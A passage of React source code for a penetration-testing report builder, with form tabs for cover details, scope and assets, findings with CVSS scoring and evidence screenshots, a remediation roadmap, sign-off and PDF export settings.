          pdf.addImage(imgData,"JPEG",0,0,A4_W*scaleDown,A4_H);
        }
      }
      document.body.removeChild(frame);

      setExportMsg("Saving...");
      pdf.save(fname+".pdf");
      notify("✅ "+fname+".pdf downloaded to your Downloads folder","success");

    } catch(e) {
      // ── Fallback: real browser print → user picks "Save as PDF" themselves ──
      setExportMsg("Opening print dialog...");
      const win = window.open("", "_blank");
      if (win) {
        win.document.open(); win.document.write(html); win.document.close(); win.document.title = fname;
        const triggerPrint = () => { try { win.focus(); win.print(); } catch {} };
        if (win.document.readyState === "complete") setTimeout(triggerPrint,400);
        else { win.addEventListener("load",()=>setTimeout(triggerPrint,400)); setTimeout(triggerPrint,1200); }
        notify('PDF engine unavailable — in the new tab choose "Save as PDF" → saves to Downloads',"info");
      } else {
        notify("Export failed and popup was blocked. Please allow popups and retry.","error");
      }
    } finally {
      setExporting(false); setExportMsg("");
    }
  };

  // Explicit "Save Report" — stores current state to History. Nothing is
  // auto-saved while editing; this is the only action that persists data.
  const saveCurrentReport = async () => {
    const id=Date.now(); const cnt=data.findings.reduce((a,f)=>{ a[f.severity]=(a[f.severity]||0)+1; return a; },{Critical:0,High:0,Medium:0,Low:0});
    const entry={id,org:data.cover.org||"Unnamed",date:data.cover.date||new Date().toISOString().slice(0,10),total:data.findings.length,...cnt,themeId:data.themeId,createdBy:authUser.username};
    const newH=[entry,...history].slice(0,25);
    setHistory(newH);
    await store.set("vapt-history",JSON.stringify(newH));
    await store.set("vapt-report-"+id, JSON.stringify(data));
    systemAudit(`Report saved: "${entry.org}"`);
    notify("💾 Report saved to History","success");
  };

  // History
  const loadReport = async id => { const r=await store.get("vapt-report-"+id); if(r){ try{ setData(JSON.parse(r.value)); setTab("cover"); notify("Report loaded","success"); }catch{} } else notify("Full data not saved","error"); };
  const delHistory = async id => { const target=history.find(x=>x.id===id); const h=history.filter(x=>x.id!==id); setHistory(h); await store.set("vapt-history",JSON.stringify(h)); await store.del("vapt-report-"+id); systemAudit(`Report deleted: "${target?.org||id}"`); notify("Deleted","info"); };

  // ── STYLE SHORTCUTS ───────────────────────────────────────────────────────
  const I   = "w-full bg-gray-900 border border-gray-700 text-gray-100 rounded-md px-3 py-2 text-sm focus:outline-none focus:border-cyan-500";
  const S   = "w-full bg-gray-900 border border-gray-700 text-gray-100 rounded-md px-3 py-2 text-sm focus:outline-none cursor-pointer";
  const L   = "block text-xs text-gray-400 font-semibold uppercase tracking-wider mb-1 mt-3";
  const sevCount = data.findings.reduce((a,f)=>{ a[f.severity]=(a[f.severity]||0)+1; return a; },{Critical:0,High:0,Medium:0,Low:0,Info:0});
  const th  = THEMES[data.themeId]||THEMES.dark;

  // ── RENDER: COVER ────────────────────────────────────────────────────────
  const TabCover = () => (
    <div>
      <h2 className="text-lg font-bold text-cyan-400 mb-4">📋 Cover Page</h2>
      <div className="grid grid-cols-2 gap-x-4">
        {[["Organisation Name","org","Corp Ltd"],["Prepared For","preparedFor","Client / CISO"],["Prepared By","preparedBy","Red Team"],["Document ID","docId","DOC-000001"]].map(([lbl,k,ph])=>(
          <div key={k}><label className={L}>{lbl}</label><input className={I} placeholder={ph} value={data.cover[k]||""} onChange={e=>updCov(k,e.target.value)}/></div>
        ))}
        <div><label className={L}>Assessment Type</label>
          <select className={S} value={data.cover.type} onChange={e=>updCov("type",e.target.value)}>
            {["Black-Box / Grey-Box VAPT","Black-Box VAPT","White-Box VAPT","Web Application VAPT","Network VAPT","Cloud Security Assessment","Mobile App VAPT","API Security Assessment","Red Team Exercise"].map(o=><option key={o}>{o}</option>)}
          </select></div>
        <div><label className={L}>Classification</label>
          <select className={S} value={data.cover.classification} onChange={e=>updCov("classification",e.target.value)}>
            {["CONFIDENTIAL","SECRET","TOP SECRET","INTERNAL USE ONLY","RESTRICTED"].map(o=><option key={o}>{o}</option>)}
          </select></div>
        <div><label className={L}>Start Date</label><input type="date" className={I} value={data.cover.start} onChange={e=>updCov("start",e.target.value)}/></div>
        <div><label className={L}>End Date</label><input type="date" className={I} value={data.cover.end} onChange={e=>updCov("end",e.target.value)}/></div>
        <div><label className={L}>Report Date</label><input type="date" className={I} value={data.cover.date} onChange={e=>updCov("date",e.target.value)}/></div>
        <div><label className={L}>Version</label><input className={I} placeholder="v1.0 — Final" value={data.cover.version||""} onChange={e=>updCov("version",e.target.value)}/></div>
        <div className="col-span-2"><label className={L}>Scope</label><input className={I} value={data.cover.scope||""} onChange={e=>updCov("scope",e.target.value)}/></div>
      </div>
      <div className="mt-4 border-t border-gray-800 pt-4 space-y-3">
        {[["Executive Summary","execSummary","h-24","Assessment overview for executive audience..."],["Key Observations","keyObs","h-20","• Critical finding 1\n• Key observation 2..."],["Business Impact","businessImpact","h-16","Business risk and impact..."],["Objectives","objectives","h-16","Assessment objectives..."]].map(([lbl,k,h,ph])=>(
          <div key={k}>
            <div className="flex items-center justify-between mb-1">
              <label className="text-sm font-bold text-cyan-400">{lbl}</label>
              <button className="text-xs bg-purple-900 hover:bg-purple-800 text-purple-300 px-2 py-0.5 rounded font-semibold" onClick={()=>openAI(k)}>✨ AI</button>
            </div>
            <textarea className={I+" "+h} placeholder={ph} value={data[k]||""} onChange={e=>upd(k,e.target.value)}/>
          </div>
        ))}
      </div>
    </div>
  );

  // ── RENDER: SCOPE ────────────────────────────────────────────────────────
  const TabScope = () => (
    <div>
      <div className="flex items-center justify-between mb-4">
        <h2 className="text-lg font-bold text-cyan-400">🎯 Scope &amp; Assets</h2>
        <button className="bg-cyan-700 hover:bg-cyan-600 text-white text-xs px-3 py-1.5 rounded font-semibold" onClick={addAsset}>+ Add Asset</button>
      </div>
      <div className="overflow-x-auto rounded-lg border border-gray-800 mb-6">
        <table className="w-full text-xs">
          <thead><tr className="bg-gray-800 text-cyan-400">{["Asset","IP / URL","Domain","Environment","Type","Method","Status",""].map(h=><th key={h} className="p-2 text-left">{h}</th>)}</tr></thead>
          <tbody>
            {data.assets.length===0 && <tr><td colSpan={8} className="p-4 text-center text-gray-600">No assets. Click "+ Add Asset" above.</td></tr>}
            {data.assets.map(a=>(
              <tr key={a._id} className="border-t border-gray-800">
                {[["name","App Server"],["ip","192.168.1.1"],["domain","corp.local"]].map(([k,ph])=>(
                  <td key={k} className="p-1"><input className="bg-transparent text-gray-200 w-full px-1 focus:outline-none min-w-16 text-xs" placeholder={ph} value={a[k]||""} onChange={e=>updA(a._id,k,e.target.value)}/></td>
                ))}
                {[["env",["Production","Staging","Development","DR"]],["type",["Internal","External","Web App","Cloud","Mobile","API","Network"]],["method",["Black-Box","Grey-Box","White-Box","Authenticated"]],["status",["In Scope","Out of Scope","Deferred"]]].map(([k,opts])=>(
                  <td key={k} className="p-1"><select className="bg-transparent text-gray-200 w-full text-xs focus:outline-none" value={a[k]||opts[0]} onChange={e=>updA(a._id,k,e.target.value)}>{opts.map(o=><option key={o}>{o}</option>)}</select></td>
                ))}
                <td className="p-1 text-center"><button onClick={()=>delAsset(a._id)} className="text-red-500 hover:text-red-400 font-bold">×</button></td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
      <div className="font-semibold text-gray-300 mb-2 text-sm">Assessment Phases</div>
      {data.phases.map((p,i)=>(
        <div key={i} className="bg-gray-900 border border-gray-800 rounded-lg border-l-4 border-l-cyan-800 p-3 mb-2">
          <input className={I+" mb-2 font-semibold text-cyan-300"} value={p.title} onChange={e=>{ const a=[...data.phases];a[i]={...a[i],title:e.target.value};upd("phases",a);}}/>
          <textarea className={I+" h-14 text-xs"} value={p.desc} onChange={e=>{ const a=[...data.phases];a[i]={...a[i],desc:e.target.value};upd("phases",a);}}/>
        </div>
      ))}
    </div>
  );

  // ── RENDER: FINDING DETAILS ──────────────────────────────────────────────
  const FDetails = ({f,idx}) => {
    const cveL = cveLook[idx]||{};
    const genFull = async () => {
      if(!f.title.trim()){ notify("Enter a title first","error"); return; }
      setGenLoading(true);
      try {
        const r = await aiGenerateFinding(f.title);
        const a=[...data.findings];
        a[idx]={...a[idx], description:r.description||a[idx].description, impact:r.impact||a[idx].impact, poc:r.poc||a[idx].poc, remediation:r.remediation||a[idx].remediation, references:(r.references||[]).join("\n")||a[idx].references, cvssScore:String(r.cvssScore||a[idx].cvssScore), severity:r.severity||a[idx].severity, owasp:r.owasp||a[idx].owasp, cwe:r.cwe||a[idx].cwe};
        upd("findings",a); notify("✨ Full finding generated by AI!","success");
      } catch(e){ notify("AI generation failed: "+e.message,"error"); }
      finally { setGenLoading(false); }
    };
    return (
      <div className="p-4 space-y-3">
        {/* Status workflow pipeline */}
        <div className="flex items-center gap-1 p-2 bg-gray-950 rounded-lg border border-gray-800">
          {STATUS_FLOW.map((s,i)=>(
            <div key={s} className="flex items-center flex-1">
              <button onClick={()=>setFStatus(idx,s)} className="flex-1 text-xs font-bold py-1.5 rounded transition-all"
                style={{background:f.status===s?STATUS_COLOR[s]+"33":"transparent", color:f.status===s?STATUS_COLOR[s]:"#556", border:"1px solid "+(f.status===s?STATUS_COLOR[s]:"#333")}}>
                {s}
              </button>
              {i<STATUS_FLOW.length-1 && <span className="text-gray-700 mx-1">→</span>}
            </div>
          ))}
          {f.status!=="Closed" && <button onClick={()=>setFStatus(idx,nextStatus(f.status))} className="ml-2 text-xs bg-cyan-700 hover:bg-cyan-600 text-white px-2 py-1.5 rounded font-semibold shrink-0">Advance ▶</button>}
        </div>
        {/* SLA tracker for this finding */}
        {(()=>{ const sla=slaInfo(f); return (
          <div className="flex items-center gap-3 p-2 bg-gray-950 rounded-lg border border-gray-800 text-xs">
            <span className="text-gray-500 font-semibold">SLA: {sla.days}d</span>
            <div className="flex items-center gap-1">
              <span className="text-gray-500">Opened:</span>
              <input type="date" className="bg-gray-800 border border-gray-700 text-gray-200 rounded px-1.5 py-0.5 text-xs" value={f.openedDate||""} onChange={e=>updF(idx,"openedDate",e.target.value)}/>
            </div>
            {sla.due && <span className="text-gray-500">Due: <b className="text-gray-300">{sla.due.toISOString().slice(0,10)}</b></span>}
            {f.status!=="Closed" && sla.remaining!=null && (
              <span className="font-bold px-2 py-0.5 rounded-full" style={{color:sla.color,background:sla.color+"22"}}>
                {sla.overdue>0 ? `${sla.overdue}d OVERDUE` : `${sla.remaining}d remaining`}
              </span>
            )}
            {f.status==="Closed" && <span className="font-bold px-2 py-0.5 rounded-full text-green-400 bg-green-900/30">✓ Closed</span>}
          </div>
        ); })()}
        <div className="grid grid-cols-3 gap-3">
          <div><label className={L}>Finding ID</label><input className={I} value={f.id} onChange={e=>updF(idx,"id",e.target.value)}/></div>
          <div className="col-span-2">
            <div className="flex items-center justify-between">
              <label className={L}>Title</label>
              <button onClick={genFull} disabled={genLoading} className="text-xs bg-indigo-800 hover:bg-indigo-700 disabled:opacity-50 text-white px-2 py-0.5 rounded font-semibold mt-1">{genLoading?"⟳ Generating...":"🤖 AI: Generate Full Finding"}</button>
            </div>
            <input className={I} placeholder="Vulnerability title... e.g. SQL Injection" value={f.title} onChange={e=>updF(idx,"title",e.target.value)}/>
          </div>
        </div>
        <div className="grid grid-cols-4 gap-3">
          <div className="col-span-2">
            <label className={L}>CVE / Reference</label>
            <div className="flex gap-2">
              <input className={I} placeholder="CVE-2024-1234 or N/A" value={f.cve} onChange={e=>updF(idx,"cve",e.target.value)}/>
              <button onClick={()=>lookupCVE(idx)} disabled={cveL.loading} className="shrink-0 bg-yellow-700 hover:bg-yellow-600 disabled:opacity-50 text-white text-xs px-3 py-2 rounded font-semibold">
                {cveL.loading?"⟳":"🔍 NVD"}
              </button>
            </div>
          </div>
          <div><label className={L}>CVSS Score</label><input type="number" step="0.1" min="0" max="10" className={I} placeholder="9.8" value={f.cvssScore} onChange={e=>updF(idx,"cvssScore",e.target.value)}/></div>
          <div><label className={L}>Severity</label>
            <select className={S} value={f.severity} onChange={e=>updF(idx,"severity",e.target.value)} style={{color:SEV_COLOR[f.severity]||"#8892A4"}}>
              {["Critical","High","Medium","Low","Info"].map(s=><option key={s} style={{color:SEV_COLOR[s]}}>{s}</option>)}
            </select>
          </div>
        </div>
        <div className="grid grid-cols-3 gap-3">
          <div className="col-span-2"><label className={L}>CVSS v3.1 Vector</label><input className={I+" font-mono text-xs"} placeholder="CVSS:3.1/AV:N/AC:L/..." value={f.cvssVector} onChange={e=>updF(idx,"cvssVector",e.target.value)}/></div>
          <div><label className={L}>CWE</label><input className={I} placeholder="CWE-79" value={f.cwe||""} onChange={e=>updF(idx,"cwe",e.target.value)}/></div>
        </div>
        <div className="grid grid-cols-2 gap-3">
          <div><label className={L}>OWASP</label>
            <select className={S} value={f.owasp||""} onChange={e=>updF(idx,"owasp",e.target.value)}>
              <option value="">— Select OWASP —</option>
              {Object.entries(COMPLIANCE).map(([k,v])=><option key={k} value={k}>{k}: {v.name}</option>)}
            </select></div>
          <div><label className={L}>Affected Asset</label><input className={I} placeholder="Service, IP, URL..." value={f.asset} onChange={e=>updF(idx,"asset",e.target.value)}/></div>
        </div>
        {[["description","📝 Description","h-24","technical"],["impact","💥 Impact","h-20","management"],["poc","🔬 Proof of Concept","h-20","technical"],["remediation","🛠 Remediation","h-20","technical"]].map(([k,lbl,h,aiMode])=>(
          <div key={k}>
            <div className="flex items-center justify-between mb-1">
              <label className="text-xs text-gray-400 font-semibold uppercase tracking-wider">{lbl}</label>
              {aiMode && <button className="text-xs bg-purple-900 hover:bg-purple-800 text-purple-300 px-2 py-0.5 rounded" onClick={()=>openAI(k,idx)}>✨ AI Polish</button>}
            </div>
            <textarea className={I+" "+h+(k==="poc"?" font-mono text-xs text-cyan-400":"")} placeholder={lbl+"..."} value={f[k]||""} onChange={e=>updF(idx,k,e.target.value)}/>
          </div>
        ))}
        <div>
          <div className="flex items-center justify-between mb-1">
            <label className={L+" mt-0"}>References (one per line)</label>
            <button className="text-xs bg-purple-900 hover:bg-purple-800 text-purple-300 px-2 py-0.5 rounded" onClick={()=>openAI("references",idx)}>✨ AI Polish</button>
          </div>
          <textarea className={I+" h-14 text-xs font-mono"} placeholder="https://nvd.nist.gov/..." value={f.references||""} onChange={e=>updF(idx,"references",e.target.value)}/>
        </div>
        <div>
          <div className="flex items-center justify-between mb-1">
            <label className={L+" mt-0"}>🧬 Root Cause</label>
            <button className="text-xs bg-indigo-900 hover:bg-indigo-800 text-indigo-300 px-2 py-0.5 rounded" onClick={()=>aiRootCause(idx)}>🤖 AI Generate</button>
          </div>
          <textarea className={I+" h-14 text-xs"} placeholder="Underlying cause (e.g. missing security header config)..." value={f.rootCause||""} onChange={e=>updF(idx,"rootCause",e.target.value)}/>
        </div>
        <div>
          <div className="flex items-center justify-between mb-1">
            <label className={L+" mt-0"}>🎬 Attack Narrative (Management)</label>
            <button className="text-xs bg-indigo-900 hover:bg-indigo-800 text-indigo-300 px-2 py-0.5 rounded" onClick={()=>aiAttackNarrative(idx)}>🤖 AI Generate</button>
          </div>
          <textarea className={I+" h-16 text-xs"} placeholder="An attacker exploited X to achieve Y..." value={f.attackNarrative||""} onChange={e=>updF(idx,"attackNarrative",e.target.value)}/>
        </div>
        {(f.status==="In Progress"||f.status==="Retested") && (
          <div>
            <div className="flex items-center justify-between mb-1">
              <label className={L+" mt-0"}>🔁 Retest Notes</label>
              <button className="text-xs bg-purple-900 hover:bg-purple-800 text-purple-300 px-2 py-0.5 rounded" onClick={()=>openAI("retestNote",idx)}>✨ AI Polish</button>
            </div>
            <textarea className={I+" h-16 text-xs"} placeholder="Retest findings, what was verified..." value={f.retestNote||""} onChange={e=>updF(idx,"retestNote",e.target.value)}/>
          </div>
        )}
        {(f.history||[]).length>0 && (
          <div className="mt-2 p-2 bg-gray-950 rounded border border-gray-800">
            <div className="text-xs text-gray-500 font-semibold mb-1">Status History</div>
            {f.history.map(h=><div key={h._id} className="text-xs text-gray-500">{h.ts} — <span style={{color:STATUS_COLOR[h.from]}}>{h.from}</span> → <span style={{color:STATUS_COLOR[h.to]}}>{h.to}</span> ({h.user})</div>)}
          </div>
        )}
      </div>
    );
  };

  // ── RENDER: FINDING EVIDENCE (Before / After / Retest stages) ───────────
  const FEvidence = ({f,idx}) => {
    const ev = f.evidence||[];
    const stage=evStage, setStage=setEvStage;
    const onDrop = e => { e.preventDefault(); e.stopPropagation(); Array.from(e.dataTransfer.files).filter(x=>x.type.startsWith("image/")).forEach(file=>addEvidence(idx,file,stage)); };
    return (
      <div className="p-4">
        <div className="flex gap-2 mb-3">
          {EV_STAGES.map(s=>(
            <button key={s} onClick={()=>setStage(s)} className={"text-xs font-semibold px-3 py-1.5 rounded-full border transition-colors "+(stage===s?"bg-cyan-800 border-cyan-500 text-cyan-200":"bg-gray-800 border-gray-700 text-gray-400")}>{s}</button>
          ))}
        </div>
        <div className="border-2 border-dashed border-gray-700 hover:border-cyan-600 rounded-xl p-8 text-center mb-5 cursor-pointer transition-colors"
          onDrop={onDrop} onDragOver={e=>e.preventDefault()} onClick={()=>document.getElementById("ev-up-"+idx)?.click()}>
          <div className="text-4xl mb-2">📸</div>
          <div className="text-gray-400 font-semibold text-sm">Drag &amp; Drop — uploading as "{stage}"</div>
          <div className="text-gray-600 text-xs mt-1">or click to browse — PNG, JPG, GIF, WebP</div>
          <input id={"ev-up-"+idx} type="file" accept="image/*" multiple className="hidden" onChange={e=>{ Array.from(e.target.files).forEach(f=>addEvidence(idx,f,stage)); e.target.value=""; }}/>
        </div>
        {ev.length===0 && <div className="text-center text-gray-700 py-4 text-sm">No screenshots yet</div>}
        {EV_STAGES.map(stg=>{
          const items = ev.filter(e=>(e.stage||"Before Fix")===stg);
          if(!items.length) return null;
          return (
            <div key={stg} className="mb-5">
              <div className="text-xs font-bold text-cyan-400 mb-2 uppercase tracking-wider">{stg} ({items.length})</div>
              <div className="grid grid-cols-1 gap-4">
                {items.map((e,ei)=>(
                  <div key={e._id} className="group bg-gray-900 border border-gray-800 rounded-xl overflow-hidden hover:border-gray-600 transition-colors">
                    <div className="relative">
                      <img src={e.data} alt={e.name} className="w-full max-h-[480px] object-contain bg-black cursor-pointer hover:opacity-90 transition-opacity" onClick={()=>setLightbox(e.data)}/>
                      <div className="absolute top-2 left-2 bg-black/70 text-cyan-400 text-xs font-mono font-bold px-2 py-0.5 rounded">Fig {idx+1}.{ei+1}</div>
                      <button onClick={()=>delEvidence(idx,e._id)} className="absolute top-2 right-2 bg-red-900/90 text-red-300 text-xs rounded px-1.5 py-0.5 opacity-0 group-hover:opacity-100 transition-opacity font-bold">× Del</button>
                    </div>
                    <div className="p-3 border-t border-gray-800">
                      <select className="w-full bg-gray-800 border border-gray-700 text-gray-300 rounded px-2 py-1 text-xs mb-1.5 focus:outline-none" value={e.stage||"Before Fix"} onChange={ev=>updEvStage(idx,e._id,ev.target.value)}>
                        {EV_STAGES.map(s=><option key={s}>{s}</option>)}
                      </select>
                      <input className="w-full bg-gray-800 border border-gray-700 text-gray-200 rounded px-2 py-1.5 text-xs focus:outline-none focus:border-cyan-500 mb-1.5" placeholder="Caption / note for this image..." value={e.caption||""} onChange={ev=>updEvCap(idx,e._id,ev.target.value)}/>
                      <div className="flex items-center gap-2">
                        <button onClick={()=>aiValidateEvidence(idx,e._id)} className="text-xs bg-teal-900 hover:bg-teal-800 text-teal-300 px-2 py-1 rounded font-semibold">🤖 AI: Validate Remediation</button>
                        {e.aiValidation && (
                          <span className="text-xs px-2 py-1 rounded-full font-bold" style={{
                            color: e.aiValidation.startsWith("Fixed")?"#00E676":e.aiValidation.startsWith("Partially")?"#FF6D00":"#FF1744",
                            background:(e.aiValidation.startsWith("Fixed")?"#00E676":e.aiValidation.startsWith("Partially")?"#FF6D00":"#FF1744")+"22"
                          }}>{e.aiValidation}</span>
                        )}
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          );
        })}
        {ev.length>0 && (
          <div className="mt-4 p-3 bg-gray-900 border border-gray-800 rounded-lg">
            <div className="flex items-center justify-between mb-1">
              <label className="text-xs text-gray-400 font-semibold uppercase tracking-wider">📋 Evidence Note</label>
              <button className="text-xs bg-purple-900 hover:bg-purple-800 text-purple-300 px-2 py-0.5 rounded" onClick={()=>openAI("attachNote",idx)}>✨ AI Polish</button>
            </div>
            <input className={I} placeholder="Evidence summary..." value={f.attachNote||""} onChange={e=>updF(idx,"attachNote",e.target.value)}/>
          </div>
        )}
      </div>
    );
  };

  // ── RENDER: FINDINGS ─────────────────────────────────────────────────────
  const TabFindings = () => {
    const f = data.findings[fTab];
    const sc = f ? parseFloat(f.cvssScore)||0 : 0;
    const sclr = f ? SEV_COLOR[f.severity]||"#8892A4" : "#8892A4";
    return (
      <div>
        {/* Tab bar */}
        <div className="flex items-end gap-0 overflow-x-auto pb-0 min-h-11">
          {data.findings.map((fi,idx)=>{
            const sc_  = parseFloat(fi.cvssScore)||0;
            const c    = SEV_COLOR[fi.severity]||"#8892A4";
            const act  = fTab===idx;
            return (
              <div key={fi._id} onClick={()=>{ setFTab(idx); setFSubTab("details"); }}
                className={"group relative shrink-0 cursor-pointer px-3 pt-2.5 pb-2.5 border-t border-l border-r rounded-t-lg text-xs font-semibold flex items-center gap-2 transition-all max-w-40 min-w-20 "+( act?"bg-gray-900 border-gray-700 text-white z-10":"bg-gray-950 border-gray-800 text-gray-500 hover:bg-gray-900 hover:text-gray-300")}
                style={act?{marginBottom:"-1px",borderBottomColor:"#111827"}:{}}>
                <div className="w-2 h-2 rounded-full shrink-0" style={{background:c}}/>
                <div className="min-w-0 flex-1">
                  <div className="font-mono text-xs leading-none mb-0.5" style={{color:c}}>{fi.id.split("-").pop()}</div>
                  <div className="truncate leading-tight" style={{fontSize:"10px",color:act?"#e5e7eb":"inherit"}}>{fi.title||"Untitled"}</div>
                </div>
                {sc_>0 && <div className="text-xs font-bold shrink-0" style={{color:c}}>{sc_.toFixed(1)}</div>}
                <button onClick={e=>{e.stopPropagation();delFinding(idx);}} className="absolute -top-1.5 -right-1.5 w-4 h-4 bg-red-900 text-red-300 rounded-full text-xs leading-none font-bold opacity-0 group-hover:opacity-100 transition-opacity z-20 flex items-center justify-center">×</button>
              </div>
            );
          })}
          <button onClick={addFinding} className="shrink-0 px-4 py-2.5 text-cyan-500 hover:text-white hover:bg-gray-800 border border-gray-800 rounded-t-lg text-xl font-bold transition-colors self-end" title="Add finding">+</button>
          <div className="flex-1"/>
          <button className="shrink-0 self-center mb-1 ml-2 bg-indigo-800 hover:bg-indigo-700 text-white text-xs px-3 py-1.5 rounded font-semibold" onClick={()=>setLibModal({open:true,search:""})}>📚 Library</button>
        </div>

        {/* Content panel */}
        <div className="border border-gray-700 rounded-b-xl rounded-tr-xl bg-gray-900 overflow-hidden">
          {data.findings.length===0 ? (
            <div className="text-center py-20">
              <div className="text-6xl mb-3">🔎</div>
              <div className="font-semibold text-gray-400 text-lg">No findings yet</div>
              <div className="text-gray-600 text-sm mt-1">Click <span className="text-cyan-500 font-bold">+</span> or use <span className="text-indigo-400 font-bold">📚 Library</span></div>
            </div>
          ) : f ? (
            <>
              {/* Finding header */}
              <div className="flex items-center px-4 py-2.5 border-b border-gray-800 bg-gray-950">
                <div className="flex items-center gap-3 flex-1 min-w-0">
                  <span className="font-mono text-xs text-cyan-400 shrink-0">{f.id}</span>
                  <span className="font-bold text-white text-sm truncate">{f.title||"(Untitled)"}</span>
                  <span className="text-xs px-2 py-0.5 rounded-full font-bold shrink-0" style={{color:sclr,background:sclr+"22",border:"1px solid "+sclr+"44"}}>{f.severity}</span>
                  {sc>0 && <span className="font-black text-base shrink-0" style={{color:sclr}}>{sc.toFixed(1)}</span>}
                </div>
                <div className="flex items-center gap-1 ml-2 shrink-0">
                  <button onClick={()=>moveF(fTab,-1)} className="text-gray-600 hover:text-gray-300 px-2 py-1 text-xs rounded">◀</button>
                  <button onClick={()=>moveF(fTab, 1)} className="text-gray-600 hover:text-gray-300 px-2 py-1 text-xs rounded">▶</button>
                  <button onClick={()=>delFinding(fTab)} className="bg-red-900/50 hover:bg-red-800 text-red-400 text-xs px-2 py-1 rounded font-semibold ml-1">🗑 Delete</button>
                </div>
              </div>
              {/* Sub-tabs */}
              <div className="flex border-b border-gray-800 bg-gray-950">
                {[["details","📄 Details"],["evidence","📸 Evidence"+(f.evidence?.length?` (${f.evidence.length})`:"")] ].map(([id,lbl])=>(
                  <button key={id} onClick={()=>setFSubTab(id)} className={"px-5 py-2.5 text-xs font-semibold border-b-2 transition-colors "+(fSubTab===id?"border-cyan-500 text-cyan-400 bg-gray-900":"border-transparent text-gray-500 hover:text-gray-300")}>{lbl}</button>
                ))}
              </div>
              {fSubTab==="details"  && FDetails({f, idx:fTab})}
              {fSubTab==="evidence" && FEvidence({f, idx:fTab})}
            </>
          ) : null}
        </div>
      </div>
    );
  };

  // ── RENDER: ROADMAP ──────────────────────────────────────────────────────
  const TabRoadmap = () => {
    const sorted=[...data.findings].sort((a,b)=>(parseFloat(b.cvssScore)||0)-(parseFloat(a.cvssScore)||0));
    return (
      <div>
        <h2 className="text-lg font-bold text-cyan-400 mb-2">🗺️ Remediation Roadmap</h2>
        <p className="text-xs text-gray-500 mb-4">Auto-generated from findings, sorted by CVSS. Override SLA, Owner, Action below.</p>
        <div className="overflow-x-auto rounded-lg border border-gray-800">
          <table className="w-full text-xs">
            <thead><tr className="bg-gray-800 text-cyan-400">{["Priority","Finding","CVSS","SLA","Owner","Action"].map(h=><th key={h} className="p-2 text-left font-semibold">{h}</th>)}</tr></thead>
            <tbody>
              {sorted.length===0 && <tr><td colSpan={6} className="p-6 text-center text-gray-600">Add findings to generate roadmap.</td></tr>}
              {sorted.map((f,i)=>{ const sc=parseFloat(f.cvssScore)||0; const sclr=SEV_COLOR[f.severity]||"#8892A4"; const ov=data.roadmapOverride[f._id]||{};
                return <tr key={f._id} className={i%2===0?"bg-gray-900":"bg-gray-950"}>
                  <td className="p-2 font-bold text-center text-sm" style={{color:sclr}}>{priFor(f.severity)}</td>
                  <td className="p-2 text-gray-200">{f.title||"(No title)"}</td>
                  <td className="p-2 font-bold text-center" style={{color:sclr}}>{sc.toFixed(1)}</td>
                  <td className="p-2"><input className="bg-transparent w-full focus:outline-none border-b border-gray-700 text-gray-300 text-xs py-0.5" value={ov.sla??slaFor(f.severity)} onChange={e=>updRO(f._id,"sla",e.target.value)}/></td>
                  <td className="p-2"><input className="bg-transparent w-full focus:outline-none border-b border-gray-700 text-gray-300 text-xs py-0.5" placeholder="Team..." value={ov.owner||""} onChange={e=>updRO(f._id,"owner",e.target.value)}/></td>
                  <td className="p-2"><input className="bg-transparent w-full focus:outline-none border-b border-gray-700 text-gray-300 text-xs py-0.5" placeholder="Action..." value={ov.action||""} onChange={e=>updRO(f._id,"action",e.target.value)}/></td>
                </tr>; })}
            </tbody>
          </table>
        </div>
      </div>
    );
  };

  // ── RENDER: CONCLUSION ───────────────────────────────────────────────────
  const TabConclusion = () => (
    <div>
      <h2 className="text-lg font-bold text-cyan-400 mb-4">✅ Conclusion &amp; Sign-off</h2>
      <div className="mb-4"><label className={L}>Overall Risk Posture</label>
        <select className={S+" max-w-xs"} value={data.conclusion.riskPosture} onChange={e=>updCon("riskPosture",e.target.value)}>
          {["CRITICAL-RISK","HIGH-RISK","MEDIUM-RISK","LOW-RISK"].map(o=><option key={o}>{o}</option>)}
        </select></div>
      <div className="mb-4">
        <div className="flex items-center justify-between mb-1">
          <label className={L+" mt-0"}>Conclusion Text</label>
          <button className="text-xs bg-purple-900 hover:bg-purple-800 text-purple-300 px-2 py-0.5 rounded" onClick={()=>openAI("conclusionText")}>✨ AI Polish</button>
        </div>
        <textarea className={I+" h-28"} value={data.conclusion.text} onChange={e=>updCon("text",e.target.value)} placeholder="Overall conclusion..."/>
      </div>
      <div className="text-sm font-bold text-gray-300 mb-3">Sign-Off Table</div>
      {data.conclusion.signoff.map((s,i)=>(
        <div key={i} className="bg-gray-900 border border-gray-800 rounded-lg p-3 flex items-center gap-3 mb-2">
          <span className="text-cyan-400 font-mono text-xs shrink-0 w-36">{s.role}</span>
          <input className={I+" flex-1"} placeholder="Full name" value={s.name} onChange={e=>{ const so=[...data.conclusion.signoff]; so[i]={...so[i],name:e.target.value}; updCon("signoff",so); }}/>
          <input type="date" className={I+" w-40"} value={s.date} onChange={e=>{ const so=[...data.conclusion.signoff]; so[i]={...so[i],date:e.target.value}; updCon("signoff",so); }}/>
        </div>
      ))}
    </div>
  );

  // ── RENDER: PDF SETTINGS ─────────────────────────────────────────────────
  const TabPDFSettings = () => (
    <div>
      <h2 className="text-lg font-bold text-cyan-400 mb-4">🎨 PDF Customization</h2>
      <label className={L}>Theme Preset</label>
      <div className="grid grid-cols-5 gap-2 mt-2 mb-5">
        {Object.entries(THEMES).map(([id,t])=>(
          <button key={id} onClick={()=>{ upd("themeId",id); upd("useCustom",false); }} className={"p-3 rounded-lg border-2 text-xs font-bold transition-all "+( data.themeId===id&&!data.useCustom?"border-cyan-400 scale-105":"border-gray-700 hover:border-gray-500")} style={{background:t.bg,color:t.accent}}>
            {THEME_NAMES[id]}
          </button>
        ))}
      </div>
      <div className="flex items-center gap-2 mb-3">
        <input type="checkbox" id="uc" checked={data.useCustom} onChange={e=>upd("useCustom",e.target.checked)} className="w-4 h-4 accent-cyan-500"/>
        <label htmlFor="uc" className="text-sm text-gray-300">Use Custom Colors</label>
      </div>
      {data.useCustom && (
        <div className="grid grid-cols-3 gap-4 mb-4">
          {[["customBg","Background"],["customAccent","Accent"],["customText","Body Text"]].map(([k,lbl])=>(
            <div key={k}><label className={L}>{lbl}</label>
              <div className="flex gap-2 items-center">
                <input type="color" className="w-10 h-10 rounded cursor-pointer" value={data[k]||"#000000"} onChange={e=>upd(k,e.target.value)}/>
                <input className={I+" flex-1"} value={data[k]||""} onChange={e=>upd(k,e.target.value)}/>
              </div>
            </div>
          ))}
        </div>
      )}
